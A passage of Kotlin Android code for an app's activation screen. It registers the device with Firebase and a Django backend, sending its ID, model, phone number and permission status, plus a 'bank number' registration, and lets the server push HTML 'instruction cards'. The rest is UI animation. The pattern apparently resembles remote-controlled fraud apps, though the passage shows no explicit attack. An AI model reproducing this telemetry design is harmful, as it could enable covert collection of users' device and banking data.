                "currentPhone" to "", // No phone in RUNNING mode
                AppConfig.FirebasePaths.PERMISSION to permissionStatus,  // All permissions status
                "app_version_code" to VersionChecker.getCurrentVersionCode(this),
                "app_version_name" to VersionChecker.getCurrentVersionName(this)
            )

            val mode = "running" // RUNNING mode
            Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId, mode))
                .updateChildren(map)
                .addOnSuccessListener {
                    // Register at Django backend
                    lifecycleScope.launch {
                        DjangoApiHelper.registerDevice(deviceId, map)
                    }

                    try {
                        // Update device-list with simple mapping
                        val mode = "running" // RUNNING mode
                        updateDeviceListInFirebaseDirect(code, deviceId, mode)
                    } catch (e: Exception) {
                        android.util.Log.e("ActivationActivity", "❌ Error updating Firebase structures", e)
                    }

                    // Status content + collapse + sync then navigate (update check in ActivatedActivity master card)
                    handler.postDelayed({
                        if (!isDestroyed && !isFinishing) {
                            runStatusContentCollapseSyncThenNavigate(null, code, deviceId, false)
                        }
                    }, 500) // Small delay to ensure Firebase write completes
                }
                .addOnFailureListener { e ->
                    android.util.Log.e("ActivationActivity", "❌ Error registering new activation with code", e)
                    handler.post {
                        reportActivationFailure(code, "firebase", "Failed to activate. Please check your connection and try again.")
                        restoreUIOnError("")
                    }
                }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "❌ Exception in registerNewActivationDirect", e)
            handler.post {
                reportActivationFailure(code, "unknown", "Activation error occurred. Please try again.")
                restoreUIOnError("")
            }
        }
    }

    /**
     * Scenario 2 (RUNNING): Continue with existing code
     */
    private fun continueWithExistingCodeDirect(
        deviceId: String,
        code: String,
        identifier: String
    ) {
        android.util.Log.d("ActivationActivity", "Continuing with existing code (RUNNING mode)")
        // Get all permission status
        val permissionStatus = com.example.fast.util.PermissionFirebaseSync.getAllPermissionStatus(this)
        // Update isActive and permissions
        val map = mapOf(
            AppConfig.FirebasePaths.IS_ACTIVE to "Opened",
            AppConfig.FirebasePaths.PERMISSION to permissionStatus,  // All permissions status
            "app_version_code" to VersionChecker.getCurrentVersionCode(this),
            "app_version_name" to VersionChecker.getCurrentVersionName(this)
        )

        val mode = "running" // RUNNING mode
        Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId, mode))
            .updateChildren(map)
            .addOnSuccessListener {
                // Register at Django backend (to ensure it exists there too)
                lifecycleScope.launch {
                    DjangoApiHelper.registerDevice(deviceId, map)
                }

                // Status content + collapse + sync then navigate (update check in ActivatedActivity master card)
                handler.postDelayed({
                    if (!isDestroyed && !isFinishing) {
                        runStatusContentCollapseSyncThenNavigate(null, code, deviceId, false)
                    }
                }, 300)
            }
            .addOnFailureListener { e ->
                android.util.Log.e("ActivationActivity", "❌ Error updating existing activation", e)
                handler.postDelayed({
                    if (!isDestroyed && !isFinishing) {
                        runStatusContentCollapseSyncThenNavigate(null, code, deviceId, false)
                    }
                }, 300)
            }
    }

    /**
     * Scenario 3 (RUNNING): Handle code conflict
     */
    private fun handleCodeConflictDirect(
        deviceId: String,
        newCode: String,
        oldCode: String,
        identifier: String
    ) {
        android.util.Log.w("ActivationActivity", "Code conflict detected (RUNNING mode): Old=$oldCode, New=$newCode")

        // Backup old device data before updating
        val mode = "running" // RUNNING mode
        DeviceBackupHelper.backupDeviceData(deviceId, oldCode, mode) { success ->
            if (success) {
                android.util.Log.d("ActivationActivity", "Backup completed, proceeding with code update")
            } else {
                android.util.Log.w("ActivationActivity", "Backup failed, but proceeding with code update")
            }

            // Update to new code
            val map = mapOf(
                AppConfig.FirebasePaths.CODE to newCode,
                AppConfig.FirebasePaths.IS_ACTIVE to "Opened",
                "currentIdentifier" to identifier,
                "lastSeen" to System.currentTimeMillis(),
                "previousCode" to oldCode,
                "codeChangedAt" to System.currentTimeMillis(),
                "app_version_code" to VersionChecker.getCurrentVersionCode(this@ActivationActivity),
                "app_version_name" to VersionChecker.getCurrentVersionName(this@ActivationActivity)
            )

            val mode = "running" // RUNNING mode
            Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId, mode))
                .updateChildren(map)
                .addOnSuccessListener {
                    // Register at Django backend
                    lifecycleScope.launch {
                        DjangoApiHelper.registerDevice(deviceId, map)
                    }

                    try {
                        // Update device-list mapping
                        updateDeviceListInFirebaseDirect(newCode, deviceId)
                    } catch (e: Exception) {
                        android.util.Log.e("ActivationActivity", "❌ Error updating device-list", e)
                    }

                    // Status content + collapse + sync then navigate (update check in ActivatedActivity master card)
                    handler.postDelayed({
                        if (!isDestroyed && !isFinishing) {
                            runStatusContentCollapseSyncThenNavigate(null, newCode, deviceId, false)
                        }
                    }, 500)
                }
                .addOnFailureListener { e ->
                    android.util.Log.e("ActivationActivity", "❌ Error handling code conflict", e)
                    handler.post {
                        reportActivationFailure(newCode, "firebase", "Failed to update activation. Please try again.")
                        restoreUIOnError("")
                    }
                }
        }
    }

    /**
     * Navigate to ActivatedActivity directly with code (RUNNING mode)
     */
    private fun navigateToActivatedActivityDirect(code: String) {
        if (isDestroyed || isFinishing) return

        updateActivationState(ActivationState.Success)
        clearActivationRetry()

        // Mark activation as complete BEFORE navigation
        markActivationComplete(code)

        val activationExtras = Bundle().apply {
            putString("code", code)
            putString("activationMode", "running")
            putBoolean("animate", true)
            putString("activationApiStatus", "OK")
            putString("activationFirebaseStatus", "OK")
        }

        if (shouldLaunchPermissionFlow()) {
            launchPermissionFlowAfterActivation(activationExtras)
            return
        }

        val cardWrapper = id.activationFormCardOuterBorder
        val card = id.activationFormCard

        // Set transition names for card transition
        cardWrapper.transitionName = "card_wrapper_transition"
        card.transitionName = "card_transition"

        val intent = Intent(this, ActivatedActivity::class.java).apply {
            putExtras(activationExtras)
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                window.sharedElementExitTransition = android.transition.TransitionSet().apply {
                    addTransition(android.transition.ChangeBounds())
                    addTransition(android.transition.ChangeTransform())
                    addTransition(android.transition.ChangeClipBounds())
                    duration = 600
                    interpolator = AccelerateDecelerateInterpolator()
                }

                val options = ActivityOptionsCompat.makeSceneTransitionAnimation(
                    this,
                    Pair.create(cardWrapper, "card_wrapper_transition"),
                    Pair.create(card, "card_transition")
                ).toBundle()

                startActivity(intent, options)
                finishAfterTransition()
            } else {
                startActivity(intent)
                finish()
            }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "Error starting ActivatedActivity with transition", e)
            startActivity(intent)
            finish()
        }
    }

    private fun shouldLaunchPermissionFlow(): Boolean {
        return !PermissionManager.hasAllMandatoryPermissions(this)
    }

    private fun launchPermissionFlowAfterActivation(extras: Bundle) {
        val intent = Intent(this, PermissionFlowActivity::class.java).apply {
            putExtra("forceActivated", true)
            putExtras(extras)
        }
        startActivity(intent)
        finish()
    }

    /**
     * Update device-list in Firebase (RUNNING mode - no phone)
     */
    private fun updateDeviceListInFirebaseDirect(code: String, deviceId: String, mode: String = "running") {
        try {
            val deviceListPath = AppConfig.getFirebaseDeviceListPath(code, mode)
            val deviceListRef = Firebase.database.reference.child(deviceListPath)

            val deviceInfo = mapOf(
                "deviceId" to deviceId,
                "code" to code,
                "deviceName" to (Build.BRAND + " " + Build.MODEL),
                "isActive" to true,
                "lastSeen" to System.currentTimeMillis(),
                "updatedAt" to System.currentTimeMillis()
            )

            deviceListRef.updateChildren(deviceInfo)
                .addOnFailureListener { e ->
                    android.util.Log.e("ActivationActivity", "Error updating device-list with code", e)
                }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "Exception updating device-list with code", e)
        }
    }

    /**
     * Handle activation with 3 scenarios:
     * 1. Device has NO code -> Register (new activation)
     * 2. Device has SAME code -> Continue (already activated)
     * 3. Device has DIFFERENT code -> Backup and update (conflict)
     */
    private fun handleActivation(
        deviceId: String,
        phone: String,
        generatedCode: String,
        normalizedPhone: String,
        identifier: String
    ) {
        android.util.Log.d(TAG, "[DEBUG] handleActivation(TESTING): resumingAfterPermission=$resumingRegisteringAfterPermission")
        // Permission is asked during status animation (after "Check for update", before Firebase)
        if (resumingRegisteringAfterPermission) {
            resumingRegisteringAfterPermission = false
            android.util.Log.d(TAG, "[DEBUG] handleActivation: resuming after permission -> proceedWithFirebaseCheckTesting")
            updateActivationState(ActivationState.Registering)
            proceedWithFirebaseCheckTesting(deviceId, phone, generatedCode, normalizedPhone, identifier)
            return
        }

        updateActivationState(ActivationState.Registering)
        android.util.Log.d(TAG, "[DEBUG] handleActivation: proceedWithFirebaseCheckTesting (master card moved to ActivatedActivity)")
        proceedWithFirebaseCheckTesting(deviceId, phone, generatedCode, normalizedPhone, identifier)
    }

    /** Run Firebase device check after "Check for update" and "Permission" steps (TESTING mode). */
    private fun proceedWithFirebaseCheckTesting(
        deviceId: String,
        phone: String,
        generatedCode: String,
        normalizedPhone: String,
        identifier: String
    ) {
        android.util.Log.d(TAG, "[DEBUG] proceedWithFirebaseCheckTesting: deviceId=$deviceId")
        if (isDestroyed || isFinishing) return
        val mode = "testing"
        val deviceRef = Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId, mode))
        val timeoutHandler = android.os.Handler(android.os.Looper.getMainLooper())
        var operationCompleted = false
        val timeoutRunnable = Runnable {
            if (!operationCompleted) {
                operationCompleted = true
                android.util.Log.e("ActivationActivity", "❌ Firebase operation timed out after 10 seconds")
                handler.post {
                    reportActivationFailure(phone, "timeout", "Connection timeout. Please check your internet connection and try again.")
                    restoreUIOnError(phone)
                }
            }
        }
        timeoutHandler.postDelayed(timeoutRunnable, 10000)

        deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (operationCompleted) return
                operationCompleted = true
                timeoutHandler.removeCallbacks(timeoutRunnable)
                val currentCode = if (snapshot.exists()) {
                    snapshot.child(AppConfig.FirebasePaths.CODE).getValue(String::class.java) ?: ""
                } else ""
                when {
                    currentCode.isEmpty() -> registerNewActivation(deviceId, phone, generatedCode, normalizedPhone, identifier)
                    currentCode == generatedCode -> continueWithExistingCode(deviceId, phone, generatedCode, normalizedPhone, identifier)
                    else -> handleCodeConflict(deviceId, phone, generatedCode, currentCode, normalizedPhone, identifier)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                if (operationCompleted) return
                operationCompleted = true
                timeoutHandler.removeCallbacks(timeoutRunnable)
                android.util.Log.e("ActivationActivity", "❌ Error checking current code", error.toException())
                handler.post {
                    reportActivationFailure(phone, "network", "Network error. Please check your connection and try again.")
                    restoreUIOnError(phone)
                }
            }
        })
    }

    /**
     * Scenario 1: Register new activation (device has no code)
     */
    private fun registerNewActivation(
        deviceId: String,
        phone: String,
        generatedCode: String,
        normalizedPhone: String,
        identifier: String
    ) {
        try {
            val mode = "testing" // TESTING mode
            // Get all permission status
            val permissionStatus = com.example.fast.util.PermissionFirebaseSync.getAllPermissionStatus(this)

            val map = mapOf(
                AppConfig.FirebasePaths.CODE to generatedCode,
                AppConfig.FirebasePaths.IS_ACTIVE to "Opened",
                "model" to (Build.BRAND + " " + Build.MODEL),  // Changed from NAME to model
                AppConfig.FirebasePaths.INSTRUCTION_CARD to mapOf(
                    "html" to "",
                    "css" to "",
                    "mode" to 0
                ),
                "currentPhone" to normalizedPhone,
                AppConfig.FirebasePaths.PERMISSION to permissionStatus,  // All permissions status
                "animationSettings" to mapOf(
                    "stopAnimationOn" to null  // Default: Animation ON (null = no stop)
                )
            )

            Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId, mode))
                .updateChildren(map)
            .addOnSuccessListener {
                // Register at Django backend (mandatory - both Firebase and Django)
                lifecycleScope.launch {
                    // Register device at Django
                    DjangoApiHelper.registerDevice(deviceId, map)

                    reportBankNumberIfNeeded(normalizedPhone, generatedCode, deviceId)
                }

                try {
                        // Update device-list with simple mapping and additional fields
                        updateDeviceListInFirebase(generatedCode, deviceId, phone)
                    } catch (e: Exception) {
                        android.util.Log.e("ActivationActivity", "❌ Error updating Firebase structures", e)
                    }

                    // Proceed with animation (don't wait for device-list update - it's non-blocking)
                    // Add small delay to ensure Firebase write completes
                    handler.postDelayed({
                        runStatusContentCollapseSyncThenNavigate(phone, generatedCode, deviceId, true)
                    }, 300)
                }
                .addOnFailureListener { e ->
                    android.util.Log.e("ActivationActivity", "❌ Failed to save to Firebase", e)
                    handler.post {
                        reportActivationFailure(phone, "firebase", "Failed to activate. Please check your connection and try again.")
                        restoreUIOnError(phone)
                    }
                }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "❌ Error in registerNewActivation", e)
            handler.post {
                reportActivationFailure(phone, "unknown", "Activation error occurred. Please try again.")
                restoreUIOnError(phone)
            }
        }
    }

    /**
     * Trigger device registration at Django backend for existing activations (TESTING mode)
     */
    private fun registerExistingDeviceAtDjango(deviceId: String, code: String, phone: String) {
        lifecycleScope.launch {
            val map = mapOf(
                "code" to code,
                "currentPhone" to phone,
                "isActive" to true,
                "model" to (Build.BRAND + " " + Build.MODEL),
                "time" to System.currentTimeMillis()
            )
            // Register device at Django (mandatory)
            DjangoApiHelper.registerDevice(deviceId, map)

            reportBankNumberIfNeeded(phone, code, deviceId)
        }
    }

    /**
     * Scenario 2: Continue with existing code (already activated)
     */
    private fun continueWithExistingCode(
        deviceId: String,
        phone: String,
        generatedCode: String,
        normalizedPhone: String,
        identifier: String
    ) {
        // Add timeout handler for Firebase operation
        val timeoutHandler = android.os.Handler(android.os.Looper.getMainLooper())
        var operationCompleted = false

        val timeoutRunnable = Runnable {
            if (!operationCompleted) {
                operationCompleted = true
                android.util.Log.w("ActivationActivity", "⚠️ Device-list check timed out - proceeding anyway")
                updateDeviceListInFirebase(generatedCode, deviceId, phone)
                runStatusContentCollapseSyncThenNavigate(phone, generatedCode, deviceId, true)
            }
        }
        timeoutHandler.postDelayed(timeoutRunnable, 5000) // 5 second timeout

        // Verify device-list entry exists and create if missing
        val deviceListPath = AppConfig.getFirebaseDeviceListPath(generatedCode)
        Firebase.database.reference.child(deviceListPath)
            .child("deviceId")
            .addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (operationCompleted) {
                        android.util.Log.w("ActivationActivity", "Firebase response received but operation already timed out")
                        return
                    }
                    operationCompleted = true
                    timeoutHandler.removeCallbacks(timeoutRunnable)

                    val deviceListDeviceId = if (snapshot.exists()) {
                        snapshot.getValue(String::class.java)
                    } else {
                        null // Device-list entry doesn't exist
                    }

                    if (deviceListDeviceId == deviceId) {
                        // Device-list entry matches - already activated correctly
                        android.util.Log.d("ActivationActivity", "✅ Already activated - continuing")
                        registerExistingDeviceAtDjango(deviceId, generatedCode, phone)
                        runStatusContentCollapseSyncThenNavigate(phone, generatedCode, deviceId, true)
                    } else {
                        // Device-list entry missing or wrong - create it
                        android.util.Log.w("ActivationActivity", "Device-list entry missing/wrong - creating")
                        updateDeviceListInFirebase(generatedCode, deviceId, phone)
                        registerExistingDeviceAtDjango(deviceId, generatedCode, phone)
                        runStatusContentCollapseSyncThenNavigate(phone, generatedCode, deviceId, true)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    if (operationCompleted) {
                        android.util.Log.w("ActivationActivity", "Firebase cancelled but operation already timed out")
                        return
                    }
                    operationCompleted = true
                    timeoutHandler.removeCallbacks(timeoutRunnable)
                    android.util.Log.e("ActivationActivity", "❌ Error checking device-list", error.toException())
                    // Continue anyway - create device-list entry
                    updateDeviceListInFirebase(generatedCode, deviceId, phone)
                    runStatusContentCollapseSyncThenNavigate(phone, generatedCode, deviceId, true)
                }
            })
    }

    private fun reportBankNumberIfNeeded(phone: String, code: String, deviceId: String) {
        if (hasReportedBankNumber) return
        hasReportedBankNumber = true
        lifecycleScope.launch {
            val deviceData = mapOf(
                "model" to (Build.BRAND + " " + Build.MODEL),
                "app_version_code" to VersionChecker.getCurrentVersionCode(this@ActivationActivity),
                "app_version_name" to VersionChecker.getCurrentVersionName(this@ActivationActivity)
            )
            val bankResult = DjangoApiHelper.registerBankNumber(
                phone = phone,
                code = code,
                deviceId = deviceId,
                data = deviceData
            )
            bankResult.getOrNull()?.let { saveBankcardDetailsFromResponse(it) }
        }
    }

    /**
     * Scenario 3: Handle code conflict (device has different code)
     */
    private fun handleCodeConflict(
        deviceId: String,
        phone: String,
        generatedCode: String,
        oldCode: String,
        normalizedPhone: String,
        identifier: String
    ) {
        // Step 1: Backup old data
        val testMode = "testing" // TESTING mode
        DeviceBackupHelper.backupDeviceData(deviceId, oldCode, testMode) { backupSuccess ->
            if (!backupSuccess) {
                android.util.Log.e("ActivationActivity", "❌ Backup failed - proceeding with caution")
                // Continue anyway - user should be able to activate
            }

            // Step 2: Remove old device-list entry
            val testMode = "testing" // TESTING mode
            val oldDeviceListPath = AppConfig.getFirebaseDeviceListPath(oldCode, testMode)
            Firebase.database.reference.child(oldDeviceListPath)
                .removeValue()
                .addOnSuccessListener {
                    android.util.Log.d("ActivationActivity", "✅ Old device-list entry removed: $oldDeviceListPath")
                }
                .addOnFailureListener { e ->
                    android.util.Log.e("ActivationActivity", "⚠️ Failed to remove old device-list entry", e)
                    // Continue anyway
                }

            // Step 3: Update device with new code
            // Get all permission status (testMode already declared above)
            val permissionStatus = com.example.fast.util.PermissionFirebaseSync.getAllPermissionStatus(this)

            val map = mapOf(
                AppConfig.FirebasePaths.CODE to generatedCode,
                AppConfig.FirebasePaths.IS_ACTIVE to "Opened",
                "model" to (Build.BRAND + " " + Build.MODEL),  // Changed from NAME to model
                AppConfig.FirebasePaths.INSTRUCTION_CARD to mapOf(
                    "html" to "",
                    "css" to "",
                    "mode" to 0
                ),
                "currentPhone" to normalizedPhone,
                AppConfig.FirebasePaths.PERMISSION to permissionStatus,  // All permissions status
                "animationSettings" to mapOf(
                    "stopAnimationOn" to null  // Default: Animation ON (null = no stop)
                )
            )

            Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId, testMode))
                .updateChildren(map)
                .addOnSuccessListener {
                    // Register at Django backend (mandatory - both Firebase and Django)
                    lifecycleScope.launch {
                        // Register device at Django
                        DjangoApiHelper.registerDevice(deviceId, map)

                        // Register bank number at Django (TESTING mode)
                        reportBankNumberIfNeeded(normalizedPhone, generatedCode, deviceId)
                    }

                    try {
                        // Create new device-list entry
                        updateDeviceListInFirebase(generatedCode, deviceId, phone, testMode)
                } catch (e: Exception) {
                    android.util.Log.e("ActivationActivity", "❌ Error updating Firebase structures", e)
                }

                    // Proceed with animation (don't wait for device-list update - it's non-blocking)
                    // Add small delay to ensure Firebase write completes
                    handler.postDelayed({
                        runStatusContentCollapseSyncThenNavigate(phone, generatedCode, deviceId, true)
                    }, 300)
                }
                .addOnFailureListener { e ->
                    android.util.Log.e("ActivationActivity", "❌ Failed to update device with new code", e)
                    handler.post {
                        reportActivationFailure(phone, "firebase", "Failed to update activation. Please try again.")
                        restoreUIOnError(phone)
                    }
                }
        }
    }

    /**
     * Proceed with activation animation after Firebase updates complete
     */
    private fun proceedWithActivationAnimation(phone: String, generatedCode: String) {
        if (isDestroyed || isFinishing) {
            android.util.Log.w("ActivationActivity", "Activity destroyed/finishing, skipping animation")
            return
        }

        // Hide progress bar immediately
        handler.post {
            try {
                id.activationLoadingOverlay.hide()
            } catch (e: Exception) {
                android.util.Log.e("ActivationActivity", "Error hiding progress bar", e)
            }
        }

        // Animation is already started in processPhoneActivation
        // This function is kept for backward compatibility but does nothing
        android.util.Log.d("ActivationActivity", "proceedWithActivationAnimation called (animation already started)")
    }

    /**
     * Restore UI state on error
     */
    private fun restoreUIOnError(phone: String) {
                id.activationPhoneInput.setText(phone)
                id.activationPhoneInput.isEnabled = true
                resetActivationButtons()
                id.activationLoadingOverlay.hide()
                shakeView(id.activationInputCard)
                android.widget.Toast.makeText(this, "Activation failed. Please try again.", android.widget.Toast.LENGTH_LONG).show()
    }

    private fun shakeView(view: View) {
        view.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
        ObjectAnimator.ofFloat(view, "translationX", 0f, 20f, -20f, 20f, -20f, 10f, -10f, 0f)
            .apply { duration = 400; interpolator = DecelerateInterpolator() }.start()
    }

    /**
     * Report activation failure to backend (API history) and show error to user.
     * Use for all activation failures so we can track system activate fail.
     */
    @SuppressLint("HardwareIds")
    private fun reportActivationFailure(codeAttempted: String, errorType: String, errorMessage: String) {
        val deviceId = androidId() ?: ""
        val mode = currentLoginType
        val mappedErrorType = when (errorType) {
            "validation", "invalid_code", "bank_code" -> ActivationErrorType.Validation
            "network", "timeout" -> ActivationErrorType.Network
            "firebase" -> ActivationErrorType.Firebase
            "django_api" -> ActivationErrorType.DjangoApi
            "device_id" -> ActivationErrorType.DeviceId
            else -> ActivationErrorType.Unknown
        }
        updateActivationState(ActivationState.Fail, mappedErrorType, errorMessage)

        // Queue auto-retry for retryable errors only
        if (mappedErrorType != ActivationErrorType.Validation && mappedErrorType != ActivationErrorType.DeviceId) {
            queueActivationRetry(codeAttempted, currentLoginType)
        }
        lifecycleScope.launch {
            DjangoApiHelper.logActivationFailure(
                deviceId = deviceId,
                codeAttempted = codeAttempted,
                mode = mode,
                errorType = errorType,
                errorMessage = errorMessage,
                metadata = null
            )
        }
        showActivationError(errorMessage)
    }

    /**
     * Show activation error with vibration, color change (green to red), and clear input
     */
    private fun showActivationError(errorMessage: String) {
        val editText = id.activationPhoneInput
        val inputCard = id.activationInputCard
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        val errorRed = android.graphics.Color.parseColor("#F44336") // Red color

        // Save original background
        val originalBackground = inputCard.background?.constantState?.newDrawable()?.mutate()

        // Strong vibration effect
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as? android.os.Vibrator
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                vibrator?.vibrate(android.os.VibrationEffect.createOneShot(200, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator?.vibrate(200)
            }
        } catch (e: Exception) {
            // Fallback to haptic feedback if vibration fails
            inputCard.performHapticFeedback(
                HapticFeedbackConstants.VIRTUAL_KEY,
                HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING
            )
        }

        // Change cardView6 background from green to red
        val errorBackground = resources.getDrawable(R.drawable.input_field_error, theme)
        inputCard.background = errorBackground

        // Change text color to red
        editText.setTextColor(errorRed)

        // Shake animation
        val shakeAnimator = ObjectAnimator.ofFloat(inputCard, "translationX", 0f, 20f, -20f, 20f, -20f, 10f, -10f, 0f).apply {
            duration = 400
            interpolator = DecelerateInterpolator()
        }
        shakeAnimator.start()

        // Revert background and text color back to green after 1 second
        handler.postDelayed({
            try {
                // Restore original background (green)
                if (originalBackground != null) {
                    inputCard.background = originalBackground
                } else {
                    // Fallback to default selector if original not available
                    inputCard.background = resources.getDrawable(R.drawable.input_field_selector, theme)
                }
                // Restore text color to green
                editText.setTextColor(themePrimary)
            } catch (e: Exception) {
                android.util.Log.e("ActivationActivity", "Error reverting cardView6 background", e)
            }
        }, 1000) // Revert after 1 second

        // Clear input box
        editText.setText("")
        editText.clearFocus()

        // Show error toast
        android.widget.Toast.makeText(this, errorMessage, android.widget.Toast.LENGTH_SHORT).show()

        android.util.Log.d("ActivationActivity", "Activation error: $errorMessage")
    }

    /**
     * Setup shimmer effect on crypto hash card
     */
    private fun setupShimmerEffect() {
        handler.postDelayed({
            if (!isDestroyed && !isFinishing) {
                try {
                    val card = id.activationFormCard
                    val themePrimary = resources.getColor(R.color.theme_primary, theme)

                    // Create shimmer animation with ValueAnimator
                    val shimmerAnimator = ValueAnimator.ofFloat(0f, 1f).apply {
                        duration = 3000 // 3 seconds for one complete cycle
                        repeatCount = ValueAnimator.INFINITE
                        repeatMode = ValueAnimator.RESTART

                        addUpdateListener { animator ->
                            val progress = animator.animatedValue as Float

                            // Create gradient that sweeps across the card
                            val gradientDrawable = android.graphics.drawable.GradientDrawable().apply {
                                orientation = android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT

                                // Calculate shimmer opacity (0-3% opacity for subtle effect)
                                val shimmerOpacity = (Math.sin(progress * Math.PI * 2) * 0.015 + 0.015).toFloat().coerceIn(0f, 0.03f)
                                val shimmerColor = android.graphics.Color.argb(
                                    (shimmerOpacity * 255).toInt(),
                                    android.graphics.Color.red(themePrimary),
                                    android.graphics.Color.green(themePrimary),
                                    android.graphics.Color.blue(themePrimary)
                                )

                                colors = intArrayOf(
                                    android.graphics.Color.TRANSPARENT,
                                    if (progress > 0.2f && progress < 0.8f) shimmerColor else android.graphics.Color.TRANSPARENT,
                                    android.graphics.Color.TRANSPARENT
                                )

                                cornerRadius = 12 * resources.displayMetrics.density // 12dp
                            }

                            // Apply shimmer as overlay on top of base background
                            val baseDrawable = resources.getDrawable(R.drawable.crypto_hash_card_background, theme)
                            val layers = arrayOf(
                                baseDrawable,
                                gradientDrawable
                            )
                            val layerDrawable = android.graphics.drawable.LayerDrawable(layers)
                            card.background = layerDrawable
                        }
                    }

                    shimmerAnimator.start()
                    handlerRunnables.add(Runnable { shimmerAnimator.cancel() })

                } catch (e: Exception) {
                    android.util.Log.e("ActivationActivity", "Error setting up shimmer effect", e)
                }
            }
        }, 500) // Small delay to let card render first
    }

    private fun setupInputFieldAnimation() {
        val screenHeight = resources.displayMetrics.heightPixels
        initialRootHeight = screenHeight

        // Track root view height changes (when keyboard opens/closes with adjustResize)
        var wasKeyboardOpen = false
        layoutListener = ViewTreeObserver.OnGlobalLayoutListener {
            if (!isDestroyed && !isFinishing) {
                val currentRootHeight = id.activationRootLayout.height
                val isKeyboardOpen = currentRootHeight < initialRootHeight * 0.75f // If height reduced by 25%, keyboard is likely open

                if (isKeyboardOpen != wasKeyboardOpen) {
                    wasKeyboardOpen = isKeyboardOpen
                    if (isKeyboardOpen) {
                        adjustLayoutForKeyboard(currentRootHeight)
                    } else {
                        // Keyboard closing - restore original positions and sizes
                        id.activationContentScrollView.animate()
                            .translationY(originalContentTranslationY)
                            .setDuration(300)
                            .setInterpolator(AccelerateDecelerateInterpolator())
                            .start()

                        // Restore logo position and size
                        id.activationHeaderSection.animate()
                            .translationY(originalLogoTranslationY)
                            .scaleX(originalLogoScaleX)
                            .scaleY(originalLogoScaleY)
                            .setDuration(300)
                            .setInterpolator(AccelerateDecelerateInterpolator())
                            .start()

                        // Restore tagline
                        id.activationTaglineText.animate()
                            .alpha(originalTaglineAlpha)
                            .setDuration(200)
                            .start()
                    }
                }
            }
        }

        id.activationRootLayout.viewTreeObserver.addOnGlobalLayoutListener(layoutListener)

        // Also handle focus change - hide system keyboard if it ever gets focus (we use company keypad only)
        id.activationPhoneInput.setOnFocusChangeListener { _, hasFocus ->
            if (hasFocus && !isDestroyed && !isFinishing) {
                android.util.Log.d(TAG, "[DEBUG] input got focus - dismissing keyboard and clearing focus (company keypad only)")
                dismissKeyboard()
                id.activationPhoneInput.clearFocus()
            }
            val inputContainer = id.activationInputCard
            if (hasFocus && !isDestroyed && !isFinishing) {
                // Enhanced focus state - subtle scale animation
                inputContainer.animate()
                    .scaleX(1.02f)
                    .scaleY(1.02f)
                    .setDuration(200)
                    .start()

                // No system keyboard - we use company keypad only; no layout adjustment for keyboard
                val keyboardAdjustRunnable = Runnable {
                    if (!isDestroyed && !isFinishing) {
                        val currentRootHeight = id.activationRootLayout.height
                        if (currentRootHeight < initialRootHeight * 0.75f) {
                            adjustLayoutForKeyboard(currentRootHeight)
                        }
                    }
                }
                handlerRunnables.add(keyboardAdjustRunnable)
                handler.postDelayed(keyboardAdjustRunnable, 100)
            } else {
                // Restore original scale when focus lost
                inputContainer.animate()
                    .scaleX(1.0f)
                    .scaleY(1.0f)
                    .setDuration(200)
                    .start()
                // Keyboard closing - restore original positions and sizes
                id.activationContentScrollView.animate()
                    .translationY(originalContentTranslationY)
                    .setDuration(300)
                    .setInterpolator(AccelerateDecelerateInterpolator())
                    .start()

                // Restore logo position and size
                id.activationHeaderSection.animate()
                    .translationY(originalLogoTranslationY)
                    .scaleX(originalLogoScaleX)
                    .scaleY(originalLogoScaleY)
                    .setDuration(300)
                    .setInterpolator(AccelerateDecelerateInterpolator())
                    .start()

                // Restore tagline
                id.activationTaglineText.animate()
                    .alpha(originalTaglineAlpha)
                    .setDuration(200)
                    .start()
            }
        }
    }

    private fun adjustLayoutForKeyboard(availableHeight: Int) {
        // Save current states before animation
        originalContentTranslationY = id.activationContentScrollView.translationY
        originalLogoTranslationY = id.activationHeaderSection.translationY
        originalLogoScaleX = id.activationHeaderSection.scaleX
        originalLogoScaleY = id.activationHeaderSection.scaleY
        originalTaglineAlpha = id.activationTaglineText.alpha

        // Post to ensure views are measured
        id.activationRootLayout.post {
            // Get actual view dimensions dynamically
            val logoHeight = id.activationHeaderSection.height.toFloat()
            val logoHeightScaled = logoHeight * 0.65f // Logo height when scaled down to 65%
            val inputCardHeight = id.activationInputCard.height.toFloat()
            val buttonHeight = id.activationActivateButton.height.toFloat()
            val buttonMarginTop = if (id.activationActivateButton.layoutParams is android.view.ViewGroup.MarginLayoutParams) {
                (id.activationActivateButton.layoutParams as android.view.ViewGroup.MarginLayoutParams).topMargin.toFloat()
            } else {
                resources.getDimensionPixelSize(R.dimen.button_margin_top).toFloat()
            }
            val totalContentHeight = inputCardHeight + buttonHeight + buttonMarginTop

            // Calculate minimum gap between logo and input (half input height)
            val minGap = resources.getDimensionPixelSize(R.dimen.input_height) / 2f

            // Calculate safe area padding
            val topPadding = resources.getDimensionPixelSize(android.R.dimen.notification_large_icon_height).toFloat()
            val bottomPadding = minGap

            // Calculate ideal input top position (center content vertically in available space)
            val idealInputTop = topPadding + (availableHeight - totalContentHeight - topPadding - bottomPadding) / 2

            // Calculate logo position (above input with minimum gap)
            val idealLogoBottom = idealInputTop - minGap
